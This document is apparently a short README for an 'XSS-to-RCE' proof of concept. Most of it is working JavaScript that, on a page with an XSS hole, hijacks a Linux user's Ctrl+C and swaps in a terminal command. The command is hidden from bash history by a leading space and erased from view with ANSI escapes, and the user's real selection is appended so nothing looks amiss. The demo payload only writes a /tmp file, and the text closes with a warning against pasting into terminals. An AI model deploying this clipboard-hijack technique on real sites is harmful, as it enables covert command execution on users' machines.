# XSS-to-RCE

The usecase is for websites that encourage linux-users to copy commands straight into the terminal.

If that website contains a XSS vulnerability, or an attacker is able to execute javascript on the page in some other way, the attacker is able to hijack the users clipboard and inject a terminal command that is quite stealthy.

The terminal command that is tricked upon the victim will not be recorded in the terminal history, and it will remove the malicious command from the terminal, by using some ANSI-tricks.

The copied command will also contain the legitimate text that the victim tried to copy, as not to rise suspicion.

So, lesson learned: never copy-paste into your terminal. Or don't allow javascript in your browser.

```javascript

document.addEventListener('keypress', (event) => {

  // Grab the keys of the user
	var key = event.which || event.keyCode; 
	var ctrl = event.ctrlKey ? event.ctrlKey : ((key === 17) ? true : false); 

	// Only hijack the victims copy-buffer if it is a linux-user
	var os = navigator.platform
	var testIfLinux = os.indexOf("Linux")


	if ((ctrl) && (key == 99) && testIfLinux == !-1){	
		// Get string that the user has highlighted
		var userstring = window.getSelection().toString()
		attack(userstring)
	}

});

function attack(userstring){

	// We need to create a new textarea (or some other element where we can write out text)
	var textarea = document.createElement('textarea');
	// Next we set the value of the text-area to the command we wish to execute
	// Include the initial space in the command so that the command won't be saved in bash history.
	// The ansi-code \033[F is equal to "Go up one line"
	// The ansi-code \033[2K is equal to "Clear this line"
	textarea.value = ' echo dödshackad > /tmp/hackad;printf "\\033[2K";\r\n' + userstring
	// The textarea needs to be appended to the DOM, in order to copy the text from it into the copy-buffer
	document.body.appendChild(textarea);
	// "Highlight" and select the text
	textarea.focus()
	textarea.select();
	document.execCommand("copy");
	document.body.removeChild(textarea);
}
```
